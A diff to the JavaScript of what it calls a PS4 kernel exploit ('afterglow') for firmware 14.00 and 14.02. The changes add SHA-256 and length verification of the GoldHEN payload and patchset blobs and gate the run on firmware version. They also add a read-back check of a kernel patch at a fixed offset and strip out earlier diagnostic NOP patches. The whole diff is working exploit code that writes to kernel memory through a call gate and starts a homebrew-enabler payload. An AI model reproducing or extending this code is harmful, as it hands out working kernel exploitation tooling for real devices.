@@ -799,6 +799,82 @@ async function fetchBytes(url, tag) {
   }
 }
 
+/* Firmware-matched assets.  A stale or substituted binary is worse than a
+   clean refusal here because these blobs contain fixed kernel offsets.  Keep
+   this tiny SHA-256 implementation local so verification also works on the
+   PS4 browser when WebCrypto is unavailable. */
+const GOLDHEN_1400 = {
+  length: 297496,
+  sha256: "39452f5e1c305ac9efcb4745eef7958b4db8c6d85299529f08700970b009ea4d",
+};
+const GOLDHEN_1402_EXPERIMENTAL = {
+  length: 297931,
+  sha256: "23fa75217949cd1be4ba0531e726c05f4ca0a2e47ed9eedb598e23da4eeacca9",
+};
+const PATCHSET_1400 = {
+  length: 641,
+  sha256: "615f275b96831cc04173757db39e93f0d27b52888976af2a6444604aa8ac5dbf",
+};
+
+function sha256Hex(bytes) {
+  const K = [
+    0x428a2f98,0x71374491,0xb5c0fbcf,0xe9b5dba5,0x3956c25b,0x59f111f1,0x923f82a4,0xab1c5ed5,
+    0xd807aa98,0x12835b01,0x243185be,0x550c7dc3,0x72be5d74,0x80deb1fe,0x9bdc06a7,0xc19bf174,
+    0xe49b69c1,0xefbe4786,0x0fc19dc6,0x240ca1cc,0x2de92c6f,0x4a7484aa,0x5cb0a9dc,0x76f988da,
+    0x983e5152,0xa831c66d,0xb00327c8,0xbf597fc7,0xc6e00bf3,0xd5a79147,0x06ca6351,0x14292967,
+    0x27b70a85,0x2e1b2138,0x4d2c6dfc,0x53380d13,0x650a7354,0x766a0abb,0x81c2c92e,0x92722c85,
+    0xa2bfe8a1,0xa81a664b,0xc24b8b70,0xc76c51a3,0xd192e819,0xd6990624,0xf40e3585,0x106aa070,
+    0x19a4c116,0x1e376c08,0x2748774c,0x34b0bcb5,0x391c0cb3,0x4ed8aa4a,0x5b9cca4f,0x682e6ff3,
+    0x748f82ee,0x78a5636f,0x84c87814,0x8cc70208,0x90befffa,0xa4506ceb,0xbef9a3f7,0xc67178f2,
+  ];
+  const bitLength = bytes.length * 8;
+  const paddedLength = (bytes.length + 9 + 63) & ~63;
+  const data = new Uint8Array(paddedLength);
+  data.set(bytes);
+  data[bytes.length] = 0x80;
+  const dv = new DataView(data.buffer);
+  dv.setUint32(paddedLength - 8, Math.floor(bitLength / 0x100000000), false);
+  dv.setUint32(paddedLength - 4, bitLength >>> 0, false);
+  const h = [0x6a09e667,0xbb67ae85,0x3c6ef372,0xa54ff53a,0x510e527f,0x9b05688c,0x1f83d9ab,0x5be0cd19];
+  const w = new Uint32Array(64);
+  const rotr = function (x, n) { return (x >>> n) | (x << (32 - n)); };
+  for (let base = 0; base < paddedLength; base += 64) {
+    for (let i = 0; i < 16; i++) w[i] = dv.getUint32(base + i * 4, false);
+    for (let i = 16; i < 64; i++) {
+      const s0 = rotr(w[i - 15], 7) ^ rotr(w[i - 15], 18) ^ (w[i - 15] >>> 3);
+      const s1 = rotr(w[i - 2], 17) ^ rotr(w[i - 2], 19) ^ (w[i - 2] >>> 10);
+      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
+    }
+    let a=h[0],b=h[1],c=h[2],d=h[3],e=h[4],f=h[5],g=h[6],z=h[7];
+    for (let i = 0; i < 64; i++) {
+      const s1 = rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25);
+      const ch = (e & f) ^ (~e & g);
+      const t1 = (z + s1 + ch + K[i] + w[i]) >>> 0;
+      const s0 = rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22);
+      const maj = (a & b) ^ (a & c) ^ (b & c);
+      const t2 = (s0 + maj) >>> 0;
+      z=g; g=f; f=e; e=(d+t1)>>>0; d=c; c=b; b=a; a=(t1+t2)>>>0;
+    }
+    h[0]=(h[0]+a)>>>0; h[1]=(h[1]+b)>>>0; h[2]=(h[2]+c)>>>0; h[3]=(h[3]+d)>>>0;
+    h[4]=(h[4]+e)>>>0; h[5]=(h[5]+f)>>>0; h[6]=(h[6]+g)>>>0; h[7]=(h[7]+z)>>>0;
+  }
+  return h.map(function (x) { return x.toString(16).padStart(8, "0"); }).join("");
+}
+
+function verifiedAsset(bytes, expected, label) {
+  if (!bytes || bytes.length !== expected.length) {
+    say("[g] " + label + " length mismatch -- refusing");
+    return false;
+  }
+  const digest = sha256Hex(bytes);
+  if (digest !== expected.sha256) {
+    say("[g] " + label + " SHA-256 mismatch -- refusing");
+    return false;
+  }
+  say("[g] " + label + " verified (" + bytes.length + " bytes)");
+  return true;
+}
+
 /* Which loader runs is decided by the CONTENT, not by the file name. There
    are two forms and they look alike from outside:
      - composite image: stub area plus payload at 0x50000, exactly
@@ -817,29 +893,29 @@ async function fetchBytes(url, tag) {
 
    It runs for both image forms. A raw payload that started without it brought
    GoldHEN up (FTP answered) but left it running without its patches. */
-async function runPatchSet(room) {
+async function runPatchSet(room, k, kbase) {
   const c = host();
-  let pset = null;
-  try {
-    const r2 = await fetch("patchset.bin");
-    if (r2.ok) pset = new Uint8Array(await r2.arrayBuffer());
-  } catch (e) {}
+  const pset = await fetchBytes("patchset.bin", "g");
   if (!pset || !pset.length) {
-    pset = readFromUSB("patchset.bin");
-  }
-  if (!pset || !pset.length) {
-    say("[g] patchset.bin not available from HTTP or USB");
+    say("[g] patchset.bin not available from HTTP");
     return false;
   }
-  if (pset.length > 0x400 - 0xc0) {
-    say("[g] the patch set does not fit in the body area");
-    return false;
-  }
+  if (!verifiedAsset(pset, PATCHSET_1400, "14.00 patchset")) return false;
   wrbuf(plus(room, 0xc0), pset);
   say("[g] patchset.bin loaded " + pset.length + " bytes -- calling gate");
   const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
   say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
       + ((pr && pr.lo >>> 0) || 0).toString(16));
+  if (!pr || pr.i32 !== 0) {
+    say("[g] patchset gate returned non-zero -- refusing to start GoldHEN");
+    return false;
+  }
+  const check = k.read(plus(kbase, 0x2fcb5c), 2);
+  if (!check || check.length !== 2 || check[0] !== 0xeb || check[1] !== 0x04) {
+    say("[g] patchset read-back failed at kernel +0x2fcb5c");
+    return false;
+  }
+  say("[g] patchset read-back verified");
   return true;
 }
 
@@ -879,25 +955,29 @@ function readFromUSB(filename) {
 }
 
 async function loadEnabler(url, k, kbase, room) {
-  let blob = readFromUSB("payload.bin");
-  if (blob) {
-    say("[e] " + blob.length + " bytes from USB");
-  } else {
-    blob = await fetchBytes(url, "e");
+  const firmware = host().firmware || "unknown";
+  if (firmware !== "14.00" && firmware !== "14.02") {
+    say("[e] GoldHEN is not enabled for firmware " + firmware + " -- refusing safely");
+    return false;
   }
+  const candidate1402 = firmware === "14.02";
+  const asset = candidate1402 ? "goldhen-1402-experimental.bin" : url;
+  const expected = candidate1402 ? GOLDHEN_1402_EXPERIMENTAL : GOLDHEN_1400;
+  const label = candidate1402 ? "experimental GoldHEN 14.02 core" : "GoldHEN 14.00";
+  const blob = await fetchBytes(asset, "e");
   if (blob === null || !blob) return false;
-  if (blob.length === GH.nlOff + GH.nlLen) {
-    say("[e] " + blob.length + " bytes -- composite image, patch chain path");
-    return loadGoldhen(url, k, kbase, room, blob);
+  if (!verifiedAsset(blob, expected, label)) return false;
+  if (blob[0] !== 0xe9) { say("[e] GoldHEN entry is not a leading jmp -- refusing"); return false; }
+  if (candidate1402) {
+    /* The ZIP's patchset is byte-for-byte the 14.00 build and writes fixed
+       kernel addresses.  The reconstructed 14.02 payload applies its own
+       known GoldHEN patches; never corrupt 14.02 by running the 14.00 blob. */
+    say("[e] 14.02 experimental route: 14.00 patchset deliberately skipped");
+    say("[e] ShellCore, ShellUI and RemotePlay patch installers remain disabled in this candidate");
+  } else if (!(await runPatchSet(room, k, kbase))) {
+    return false;
   }
-  if (blob.length && blob[0] === 0xe9) {
-    say("[e] " + blob.length + " bytes, leading jmp -- raw payload path");
-    say("[e] raw payload -- gated step-loader: patchset + kernel padding route");
-    return loadRawKernel(url, k, kbase, room, blob);
-  }
-  say("[e] " + blob.length + " bytes: neither the composite image ("
-      + (GH.nlOff + GH.nlLen) + ") nor a raw payload (leading jmp) -- refusing");
-  return false;
+  return loadPayload(asset, blob);
 }
 
 async function loadPayload(url, vorab) {
@@ -953,28 +1033,6 @@ async function loadPayload(url, vorab) {
       say("[p] copy mismatch at 0x" + o.toString(16)); return false;
     }
   }
-  /* The gated step-loader proved patch_kernel_installer (image 0x1025) freezes
-     on its *IMP_DISABLE_CONSOLE_OUTPUT write at image 0x1068 (10 bytes) -- the
-     port resolves that data import to a bad 14.02 address. NOP it in the
-     staged image so the install survives; the banner stays quiet until the
-     real offset is derived. */
-  for (let o = 0; o < 10; o++) wr1(plus(entry, 0x1068 + o), 0x90);
-  /* M_TEMP fix in the ksdk TABLE, not the runtime global: patch the q[14]
-     immediate's high dword (image 0x3490, out[29]) from 0x2be1f0 -- which is
-     code -- to 0x1520d00, the data zone the kernel's own malloc callers use
-     171 times. resolve_imports then computes M_TEMP = kbase+0x1520d00. The
-     earlier override wrote the staging copy's global, but the loader runs from
-     the padding copy, so it never took. */
-  wr1(plus(entry, 0x3490), 0x00); wr1(plus(entry, 0x3491), 0x0d);
-  wr1(plus(entry, 0x3492), 0x52); wr1(plus(entry, 0x3493), 0x01);
-  say("[p] console-output write NOP'd (0x1068), M_TEMP -> 0x1520d00 (0x3490)");
-  /* Diagnostic split on the REAL-stack route: NOP the kpayload entry call
-     (image 0x1136, ff542408) so goldhen_main returns after elf_load. If the
-     console now SURVIVES, malloc+elf_load work on the real kernel stack and
-     every remaining panic is GoldHEN's kpayload entry. If it still panics,
-     malloc/elf itself is still broken and I fix that before the kpayload. */
-  for (let o = 0; o < 4; o++) wr1(plus(entry, 0x1136 + o), 0x90);
-  say("[p] kpayload entry call NOP'd (0x1136) -- loader-only run");
   say("[p] payload copied and verified, starting thread");
 
   /* The table blanks both pthread_create fields for this firmware, but only
@@ -1064,20 +1122,8 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
     c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
   }
   say("[p] " + blob.length + " loader bytes staged at " + text(buf));
-  /* DIAGNOSTIC: patch_kernel_installer (0x1025) froze the console. Its only
-     unproven write is *IMP_DISABLE_CONSOLE_OUTPUT = 0 -- mov rdx,[rip+0x463e9];
-     mov byte [rdx],0 at image 0x1068 (10 bytes). The five installer text patches
-     are PROVEN 14.02; this import-derived data write is the suspect. NOP it in
-     the staged image to isolate: if [3] now returns, this write was the freeze.
-     The banner may stay quiet; services still load. */
-  for (let o = 0; o < 10; o++) wr1(plus(buf, 0x1068 + o), 0x90);
-  /* second isolation: the kpayload entry call in load_and_start_kpayload,
-     `call qword ptr [rsp+8]` at image 0x1136 (ff542408). NOP it to find out
-     whether [5] freezes inside the loader's own inflate/elf_load (loader-side
-     imports) or inside the kpayload's entry (GoldHEN's 14.02 port). With the
-     call gone eax stays 0 and [5] returns clean. */
-  for (let o = 0; o < 4; o++) wr1(plus(buf, 0x1136 + o), 0x90);
-  say("[p] diag: NOP'd console-output write (0x1068) and kpayload entry call (0x1136)");
+  /* Kept only for offline comparison.  The production route never calls this
+     step-driver, and it must not rewrite instructions inside the payload. */
 
   const t = plus(kbase, GH.rvaPad);
   const tram = { n: 0 };
@@ -1094,7 +1140,7 @@ async function loadRawKernel(url, k, kbase, room, vorab) {
 
   say("[p] kernel base " + text(kbase) + ", padding " + text(t));
   say("[p] ---> calling runPatchSet");
-  if (!(await runPatchSet(room))) return false;
+  if (!(await runPatchSet(room, k, kbase))) return false;
   say("[p] patchset ok ---> calling paddingRW");
   if (!paddingRW(k, kbase)) { say("[p] stopping: padding would stay read only"); return false; }
 
@@ -1214,7 +1260,7 @@ async function loadKpayloadSteps(k, kbase, room) {
   const saySync = function (m) { try { const x = new XMLHttpRequest(); x.open("GET", "ag_log?m=" + encodeURIComponent(m), false); x.send(); } catch (e) {} };
 
   say("[kp] kernel base " + text(kbase) + ", padding " + text(t));
-  if (!(await runPatchSet(room))) return false;
+  if (!(await runPatchSet(room, k, kbase))) return false;
   const dmapPad = paddingRW(k, kbase);
   if (!dmapPad) { say("[kp] stopping: padding setup failed"); return false; }
 
@@ -1492,7 +1538,7 @@ async function loadGoldhen(url, k, kbase, room, vorab) {
      +0x47000 and said nothing about any other, which is exactly the trap the
      Lua notes warn about: one page in eighteen. 641 bytes fit in the body
      area, +0xc0 to +0x400. afterglow rebuilds that body on its next use. */
-  if (!(await runPatchSet(room))) return false;
+  if (!(await runPatchSet(room, k, kbase))) return false;
 
   /* The Lua chain calls 0x144d and 0xce9 here. Their job is to work out the
      kernel base and leave it at +0x47b20, which step 4 then reads back -- we
@@ -1897,7 +1943,14 @@ async function attempt(ctx, opts) {
   STATE.ctx = ctx;
   opts = opts || {};
   STATE.retry = false;
-  say("afterglow -- ps4 kernel exploit, firmware 14.00 / 14.02 (raw13 host)");
+  if (ctx.firmware !== "14.00" && ctx.firmware !== "14.02") {
+    say("afterglow -- firmware " + (ctx.firmware || "unknown")
+        + " is not enabled in this release; stopping before the kernel stage");
+    return false;
+  }
+  say(ctx.firmware === "14.02"
+      ? "afterglow -- ps4 kernel exploit, firmware 14.02 (experimental GoldHEN core candidate)"
+      : "afterglow -- ps4 kernel exploit, firmware 14.00 (verified GoldHEN route)");
 
   const missing = seedStubs();
   if (missing.length) {
@@ -2456,7 +2509,8 @@ async function attempt(ctx, opts) {
   const want = (ctx.params && ctx.params.get("payload"));
   const mode = (ctx.params && ctx.params.get("mode")) || "";
   if (mode === "kpstep") {
-    iface.payload = await loadKpayloadSteps(k, kbase, hostFree);
+    say("[kp] diagnostic step-loader is disabled in this release");
+    iface.payload = false;
   } else if (want !== "") {
     iface.payload = (mode === "goldhen")
       ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
